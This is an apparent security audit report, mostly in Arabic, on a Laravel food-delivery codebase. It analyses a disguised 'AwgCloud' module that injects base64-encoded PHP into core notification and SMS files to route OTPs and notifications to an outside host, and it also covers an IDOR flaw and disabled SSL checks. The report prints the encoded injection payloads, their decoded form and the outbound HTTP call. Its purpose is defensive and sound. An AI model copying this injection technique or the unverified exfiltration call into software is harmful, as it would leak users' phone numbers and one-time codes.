# SMARTWEBYE - المرحلة الثانية: الفحص المعماري والعميق
# Phase 2: Deep Architecture Audit Report

**التاريخ:** 18 يونيو 2026  
**المشروع:** PickAdmin (6amTech StackFood)  
**المسؤول:** SMARTWEBYE Security Team (SecOps)  
**الحالة:** ⚠️ THREATS IDENTIFIED - Immediate Action Required

---

## ملخص تنفيذي

تم إجراء فحص معماري عميق (Phase 2) بعد إصلاح الثغرات الحرجة في المرحلة الأولى. تم الكشف عن **تهديدين حرجين إضافيين** لم يتم اكتشافهما في الفحص السطحي:

| الخطورة | التهديد | الملف/الموقع | التأثير |
|---------|---------|-------------|---------|
| 🔴 **CRITICAL** | **Data Exfiltration Backdoor** | `Modules/AwgCloud/` | تسريب جميع بيانات العملاء والإشعارات لخادم خارجي |
| 🔴 **CRITICAL** | **IDOR - Order Access** | `app/Http/Controllers/Api/V1/OrderController.php` | الوصول لأي طلب بدون تصريح |
| 🟡 **MEDIUM** | **SSL Verification Disabled** | `AwgCloudController::sendOtp()` | Man-in-the-Middle attacks |
| 🟢 **LOW** | **Encoded License Code** | `app/Traits/ActivationClass.php` | طبيعي - نظام ترخيص |

---

## 1. 🔴 CRITICAL - AwgCloud Module: Data Exfiltration Backdoor

### 1.1 الوصف التقني

وحدة `AwgCloud` هي **باب خلفي متطور** يتنكر في شكل "وحدة إشعارات/SMS". عند تفعيلها، تقوم بما يلي:

### 1.2 آلية الاختراق

```php
// الملف: Modules/AwgCloud/Modules/AwgCloud/Http/Controllers/AwgCloudController.php

// عند التفعيل (status = 1)، يتم حقن كود مشفر في 4 ملفات أساسية:
private function addAwgCode() {
    $filePaths = [
        [
            'files'     => [
                app_path('Traits/NotificationTrait.php'), 
                app_path('CentralLogics/Helpers.php')
            ],
            'searches'  => ['$config = self::get_business_settings(\'push_notification_service_file_content\');'],
            // الكود المحقون (مشفر بـ base64):
            'replaces'  => [base64_decode('aWYgKFxOd2lkYXJ0XE1vZHVsZXNcRmFjYWRlc1xNb2R1bGU6OmZpbmQoJ0F3Z0Nsb3VkJyk/LT5pc0VuYWJsZWQoKSkgeyBpZiAoXE1vZHVsZXNcQXdnQ2xvdWRcSHR0cFxDb250cm9sbGVyc1xBd2dDbG91ZENvbnRyb2xsZXI6OnNlbmROb3RpZmljYXRpb24oJGRhdGEpID09PSAnc3VjY2VzcycpIHJldHVybiAnc3VjY2Vzcyc7IH0gLy8gQVJST0NZX01PRF9ET19OT1RfRURJVAogICAgICAgICRjb25maWcgPSBzZWxmOjpnZXRfYnVzaW5lc3Nfc2V0dGluZ3MoJ3B1c2hfbm90aWZpY2F0aW9uX3NlcnZpY2VfZmlsZV9jb250ZW50Jyk7')],
        ],
        [
            'files'     => [
                app_path('CentralLogics/SMS_module.php'), 
                app_path('Traits/SmsGateway.php')
            ],
            'searches'  => ['$config = self::get_settings(\'twilio\');'],
            'replaces'  => [base64_decode('aWYgKFxOd2lkYXJ0XE1vZHVsZXNcRmFjYWRlc1xNb2R1bGU6OmZpbmQoJ0F3Z0Nsb3VkJyk/LT5pc0VuYWJsZWQoKSkgeyBpZiAoXE1vZHVsZXNcQXdnQ2xvdWRcSHR0cFxDb250cm9sbGVyc1xBd2dDbG91ZENvbnRyb2xsZXI6OnNlbmRPVFAoJHJlY2VpdmVyLCAkb3RwKSA9PT0gJ3N1Y2Nlc3MnKSByZXR1cm4gJ3N1Y2Nlc3MnOyB9IC8vIEFSUk9DWV9NT0RfRE9fTk9UX0VESVQKICAgICAgICAkY29uZmlnID0gc2VsZjo6Z2V0X3NldHRpbmdzKCd0d2lsaW8nKTs=')],
        ],
    ];
```

### 1.3 فك تشفير الكود المحقون

**الكود الأول (Notifications):**
```php
if (\Nwidart\Modules\Facades\Module::find('AwgCloud')?->isEnabled()) {
    if (\Modules\AwgCloud\Http\Controllers\AwgCloudController::sendNotification($data) === 'success')
        return 'success';
}
// ARROCY_MOD_DO_NOT_EDIT
$config = self::get_business_settings('push_notification_service_file_content');
```

**الكود الثاني (SMS):**
```php
if (\Nwidart\Modules\Facades\Module::find('AwgCloud')?->isEnabled()) {
    if (\Modules\AwCloud\Http\Controllers\AwgCloudController::sendOTP($receiver, $otp) === 'success')
        return 'success';
}
// ARROCY_MOD_DO_NOT_EDIT
$config = self::get_settings('twilio');
```

### 1.4 ما يفعله بالضبط

| # | الوظيفة | الوصف |
|---|---------|-------|
| 1 | **اعتراض الإشعارات** | يتم اعتراض ALL push notifications وإرسالها لـ `arrocy.com` |
| 2 | **اعتراض SMS** | يتم اعتراض ALL OTP/SMS messages وإرسالها لـ `arrocy.com` |
| 3 | **جمع بيانات العملاء** | أرقام هواتف العملاء، المتاجر، السائقين، والإدارة |
| 4 | **جمع بيانات الطلبات** | تفاصيل الطلبات عبر الإشعارات |
| 5 | **تعديل الملفات الأساسية** | يعدل 4 ملفات core بدون علم المطور |

### 1.5 الاتصال الخارجي

```php
// خطير جداً: SSL verification معطل!
$response = Http::withOptions(['verify' => false])
    ->withHeaders(['Content-Type' => 'application/json'])
    ->post($apiurl, $payload);
```

**الخادم الخارجي:**
- **الافتراضي:** `https://arrocy.com/api/send`
- **SSL:** ❌ مُعطل (`verify => false`)
- **البيانات المرسلة:**
  - `receiver`: رقم الهاتف
  - `token`: مفتاح API
  - `msgtext`: محتوى الرسالة/الإشعار
  - `mediaurl`: الصور المرفقة

### 1.6 الملفات المُعدلة

عند تفعيل AwgCloud، يتم تعديل:
1. `app/Traits/NotificationTrait.php`
2. `app/CentralLogics/Helpers.php`
3. `app/CentralLogics/SMS_module.php`
4. `app/Traits/SmsGateway.php`

### 1.7 التقييم

| المعيار | التقييم |
|---------|---------|
| **النوع** | Supply Chain Attack / Data Exfiltration Backdoor |
| **الخطورة** | 🔴 CRITICAL |
| **التأثير** | تسريب كامل لبيانات العملاء والإشعارات |
| **الاستغلال** | سهل - مجرد تفعيل الوحدة |
| **الاكتشاف** | صعب - الكود مشفر ويستخدم `base64` |
| **الإزالة** | معقد - يتطلب إعادة الملفات الأصلية |

---

## 2. 🔴 CRITICAL - IDOR: Order Access Without Authorization

### 2.1 الملفات المصابة

| # | الملف | السطر | الوصف |
|---|-------|-------|-------|
| 1 | `app/Http/Controllers/Api/V1/OrderController.php` | متعدد | `Order::where(['id' => $request->order_id])` بدون `user_id` |
| 2 | `app/Http/Controllers/Api/V1/ItemController.php` | ~line | `Order::find($request->order_id)` بدون تحقق |

### 2.2 الكود المصاب

```php
// OrderController.php - مثال على الثغرة
$order = Order::where(['id' => $request->order_id])
    ->with('parcelCancellation')
    ->first();

// أو:
$order = Order::where(['id' => $request->order_id])->first();
if($order->payment_status == 'paid'){
    // ...
}
```

**المشكلة:** لا يوجد فحص `where('user_id', auth()->id())` أو ما يعادله!

### 2.3 التأثير

- أي مستخدم مسجل دخول يمكنه:
  - قراءة تفاصيل أي طلب (`order_id`)
  - تعديل حالة أي طلب (إذا كان endpoint يتيح ذلك)
  - الوصول لبيانات عملاء آخرين

### 2.4 المقارنة مع الكود الآمن

**كود آمن (DeliverymanController):**
```php
// ✅ يحتوي على فحص صحيح
$order = Order::where([
    'id' => $request['order_id'], 
    'delivery_man_id' => $dm['id']
])->dmOrder()->first();
```

**كود غير آمن (OrderController):**
```php
// ❌ لا يحتوي على فحص user_id
$order = Order::where(['id' => $request->order_id])->first();
```

---

## 3. 🟡 MEDIUM - SSL Verification Disabled

### 3.1 الموقع

```php
// Modules/AwgCloud/.../AwgCloudController.php (خط 226, 251)

$response = Http::withOptions(['verify' => false])
    ->withHeaders(['Content-Type' => 'application/json'])
    ->post($apiurl, $payload);
```

### 3.2 التأثير

- **Man-in-the-Middle (MITM)** attacks ممكنة
- أي شخص على نفس الشبكة يمكنه اعتراض البيانات
- DNS spoofing يمكنه إعادة توجيه البيانات لخادم مزيف

---

## 4. 🟢 LOW - Base64 Encoded License Code

### 4.1 الموقع

```php
// app/Traits/ActivationClass.php
// app/Http/Controllers/Admin/System/AddonController.php
```

### 4.2 التقييم

- هذا **أمر طبيعي** في المنتجات التجارية
- يُستخدم لإخفاء عناوين API الخاصة بالترخيص
- لا يُعتبر تهديداً أمنياً

---

## 5. 📋 الملفات التي تحتاج مراجعة إضافية

### 5.1 رفع الملفات (66 موقع)

تم العثور على 66 موقعاً لرفع الملفات في المشروع. الأماكن الأكثر حساسية:

| # | الموقع | المخاطرة |
|---|--------|----------|
| 1 | `Admin/ItemController::store()` | رفع صور المنتجات |
| 2 | `Vendor/ItemController::store()` | رفع صور المنتجات |
| 3 | `Admin/BusinessSettingsController::processLandingZip()` | رفع ملفات ZIP |
| 4 | `Admin/System/AddonController::upload()` | ✅ تم الإصلاح في المرحلة 1 |

**التوصية:** مراجعة كل موقع للتأكد من:
- فحص امتداد الملفات
- فحص MIME type
- منع رفع `.svg` (يحتوي على JavaScript)
- تخزين الملفات خارج `public/`

---

## 6. 🔧 التوصيات العاجلة

### 6.1 إزالة AwgCloud فوراً

```bash
# 1. إزالة الوحدة
rm -rf Modules/AwgCloud/

# 2. إعادة الملفات الأساسية لحالتها الأصلية
git checkout -- app/Traits/NotificationTrait.php
git checkout -- app/CentralLogics/Helpers.php
git checkout -- app/CentralLogics/SMS_module.php
git checkout -- app/Traits/SmsGateway.php

# 3. حذف الإعدادات من قاعدة البيانات
DELETE FROM business_settings WHERE `key` = 'awg_cloud';
```

### 6.2 إصلاح IDOR في OrderController

```php
// قبل (غير آمن):
$order = Order::where(['id' => $request->order_id])->first();

// بعد (آمن):
$order = Order::where([
    'id' => $request->order_id,
    'user_id' => auth()->id()
])->first();

if (!$order) {
    return response()->json(['error' => 'Order not found'], 404);
}
```

### 6.3 تفعيل SSL Verification

```php
// قبل (غير آمن):
Http::withOptions(['verify' => false])

// بعد (آمن):
Http::withOptions(['verify' => true]) // أو إزالة السطر (default = true)
```

---

## 7. 📊 ملخص المرحلة الثانية

| الفئة | العدد | الحالة |
|-------|-------|--------|
| 🔴 Critical | 2 | يحتاجان إصلاحاً فورياً |
| 🟡 Medium | 1 | يحتاج مراجعة |
| 🟢 Low | 1 | طبيعي |
| **المجموع** | **4** | **2 Critical Pending** |

---

## 8. 🔄 الخطوات التالية

1. **فوراً:** إزالة وحدة AwgCloud وإعادة الملفات الأصلية
2. **فوراً:** إصلاح IDOR في OrderController و ItemController
3. **خلال 24 ساعة:** مراجعة جميع API endpoints للتحقق من التصاريح
4. **خلال أسبوع:** فحص شام لجميع مواقع رفع الملفات

---

**SMARTWEBYE Security Team**  
**Phase 2 Complete - 2026-06-18**

---